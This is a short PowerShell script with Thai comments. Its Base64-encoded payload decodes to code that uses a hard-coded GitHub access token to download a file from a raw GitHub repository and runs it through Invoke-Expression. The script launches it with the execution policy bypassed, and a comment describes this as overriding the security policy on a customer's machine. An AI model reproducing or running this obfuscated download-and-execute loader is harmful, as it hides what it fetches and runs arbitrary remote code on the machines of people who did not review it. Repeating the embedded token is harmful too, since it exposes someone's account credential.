# ก้อน Base64 ตัวใหม่นี้ทำการตัดคำสั่ง -WindowStyle Hidden ข้างในออกเรียบร้อยแล้ว
$c = "JHRva2VuID0gJ2docF9VWjUxN0R6eWx1MmxvVU8xWUV3Rk5vWnVMMmpsZ1IyWGRTY2onOyAkaGVhZGVycyA9IEB7QXV0aG9yaXphdGlvbiA9ICd0b2tlbiAnICsgJHRva2VufTsgJHJlc3AgPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcGhhdHRhcmFrb3JueWluZGVlLWJlZXAvc2V0dGluZy1kZWs3MC1DT0RFL3JlZnMvaGVhZHMvbWFpbi9zZXR0aW5nLWRlazcwLUNPREUnIC1IZWFkZXJzICRoZWFkZXJzOyBJbnZva2UtRXhwcmVzc2lvbiAkcmVzcA=="
$b = [System.Convert]::FromBase64String($c)
$code = [System.Text.Encoding]::UTF8.GetString($b)

# บังคับรันแบบเปิดหน้าต่างปกติ (Bypass นโยบายความปลอดภัยเครื่องลูกค้าให้ด้วย)
powershell -NoProfile -ExecutionPolicy Bypass -Command "$code"
